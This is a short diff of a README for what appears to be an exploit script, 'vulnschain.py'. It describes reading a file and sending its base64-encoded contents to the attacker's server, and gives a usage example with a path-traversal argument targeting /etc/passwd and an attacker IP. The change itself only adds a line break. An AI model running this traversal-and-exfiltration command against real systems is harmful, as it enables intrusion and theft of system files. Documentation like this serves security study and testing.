@@ -7,5 +7,5 @@ The process goes like the following:
 3. Finally we receive the contents encoded in base64 in our server, decode them and shem through the terminal, all with just one line.
 
 To run the script:
-`python3 vulnschain.py <file-to-read> <attacker-ip>`
+`python3 vulnschain.py <file-to-read> <attacker-ip>`</br>
 E.g. `python3 vulnschain.py ../../../../../etc/passwd 10.10.1.2`
